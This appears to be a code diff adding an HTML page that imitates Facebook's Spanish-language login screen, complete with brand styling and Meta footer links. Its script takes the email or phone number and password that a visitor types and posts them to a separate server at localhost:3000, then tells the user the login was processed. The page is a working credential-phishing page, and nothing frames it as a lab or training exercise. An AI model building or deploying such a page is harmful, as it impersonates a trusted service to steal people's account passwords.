@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Iniciar sesión</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding-top: 80px;
+      box-sizing: border-box;
+    }
+
+    .logo-title {
+      font-size: 48px;
+      font-weight: bold;
+      color: #1877f2;
+      margin-bottom: 30px;
+    }
+
+    .login-box {
+      background-color: #fff;
+      width: 390px;
+      padding: 20px 24px 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+
+    .login-subtitle {
+      font-size: 18px;
+      color: #1c1e21;
+      margin-bottom: 20px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px 12px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 14px;
+      font-size: 17px;
+      font-weight: bold;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    .login-button:hover {
+      background-color: #165ecc;
+    }
+
+    .forgot-link {
+      display: block;
+      color: #1877f2;
+      font-size: 14px;
+      margin-top: 16px;
+      text-decoration: none;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    /* FOOTER */
+    footer {
+      background-color: transparent;
+      padding: 30px 20px;
+      font-size: 13px;
+      color: #737373;
+      text-align: center;
+    }
+
+    .footer-links {
+      max-width: 980px;
+      margin: 0 auto;
+    }
+
+    .footer-links a {
+      color: #737373;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-divider {
+      border-top: 1px solid #dddfe2;
+      margin: 15px 0;
+    }
+
+    .footer-copy {
+      color: #737373;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- LOGO FUERA DE LA CARD -->
+    <div class="logo-title">facebook</div>
+
+    <!-- FORMULARIO DE LOGIN -->
+    <div class="login-box">
+      <div class="login-subtitle">Iniciar sesión en facebook</div>
+        <form id="login-form">
+          <input type="text" id="email" name="usuario" class="input-field" placeholder="Correo electrónico o número de teléfono" required />
+          <input type="password" id="password" name="password" class="input-field" placeholder="Contraseña" required />
+          <button type="submit" class="login-button">Iniciar sesión</button>
+        </form>
+      <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="footer-links">
+      <div>
+        <a href="#">Español</a>
+        <a href="#">English (US)</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">Français (France)</a>
+        <a href="#">Italiano</a>
+        <a href="#">Deutsch</a>
+        <a href="#">العربية</a>
+        <a href="#">日本語</a>
+        <a href="#">हिन्दी</a>
+        <a href="#">中文(简体)</a>
+        <a href="#">+</a>
+      </div>
+      <div class="footer-divider"></div>
+      <div>
+        <a href="#">Registrarte</a>
+        <a href="#">Iniciar sesión</a>
+        <a href="#">Messenger</a>
+        <a href="#">Facebook Lite</a>
+        <a href="#">Video</a>
+        <a href="#">Meta Pay</a>
+        <a href="#">Tienda de Meta</a>
+        <a href="#">Meta Quest</a>
+        <a href="#">Ray-Ban Meta</a>
+        <a href="#">Meta AI</a>
+        <a href="#">Instagram</a>
+        <a href="#">Threads</a>
+        <a href="#">Centro de información de votación</a>
+        <a href="#">Política de privacidad</a>
+        <a href="#">Centro de privacidad</a>
+        <a href="#">Información</a>
+        <a href="#">Crear anuncio</a>
+        <a href="#">Crear página</a>
+        <a href="#">Desarrolladores</a>
+        <a href="#">Empleo</a>
+        <a href="#">Cookies</a>
+        <a href="#">Opciones de anuncios</a>
+        <a href="#">Condiciones</a>
+        <a href="#">Ayuda</a>
+        <a href="#">Importación de contactos y no usuarios</a>
+      </div>
+    </div>
+    <div class="footer-copy">Meta © 2025</div>
+  </footer>
+  <script>
+  const form = document.getElementById('login-form');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const emailOrPhone = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    try {
+      const response = await fetch('http://localhost:3000/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ emailOrPhone, password })
+      });
+
+      if (response.ok) {
+        alert('Inicio de sesión procesado');
+      } else {
+        alert('Hubo un error en el servidor');
+      }
+    } catch (err) {
+      console.error('Error al enviar datos:', err);
+      alert('No se pudo conectar con el servidor');
+    }
+  });
+</script>
+</body>
+</html>
